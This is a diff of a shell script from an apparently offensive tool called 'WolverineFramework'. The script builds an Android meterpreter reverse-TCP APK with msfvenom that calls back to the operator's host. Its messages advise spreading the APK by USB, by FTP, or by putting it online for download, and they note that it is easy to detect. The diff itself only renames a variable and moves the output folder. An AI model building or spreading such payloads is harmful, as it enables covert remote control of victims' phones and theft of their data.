@@ -5,14 +5,14 @@ lhost=$(hostname -I | awk '{print $1}')
     echo "Which port do you want to use ?"
     read -p "WolverineFramework - Port> " lport
     echo "What name do you want to give to the .apk file ? (don't put .apk)"
-    read -p "WolverineFramework - File Name> " extension
-    sudo mkdir APK
-	dossier=$(pwd)
+    read -p "WolverineFramework - File Name> " fileName
+    sudo mkdir ~/Wolverine_ExeFiles
+    sudo mkdir ~/Wolverine_ExeFiles/APK
     echo "Creating .apk file..."
-    sudo msfvenom -p android/meterpreter/reverse_tcp lost=$lhost lport=$lport R > ~/$extension.apk
-    sudo mv ~/$extension.apk $dossier/APK
+    sudo msfvenom -p android/meterpreter/reverse_tcp lost=$lhost lport=$lport R > ~/$fileName.apk
+    sudo mv ~/$fileName.apk ~/Wolverine_ExeFiles/APK
     echo ""
-    echo "The apk is in this folder : " $dossier/APK
+    echo "The apk is in this folder : " ~/Wolverine_ExeFiles/APK
     tput setaf 7
     echo "Once it's done, I advise you to take the .apk file with an USB key or by FTP/SFTP, so you can put it on an Android Phone, or put it on the Internet to  make it downloadable,
 but, the .apk file is very detectable, so don't forget to install it on the phone by yourself."
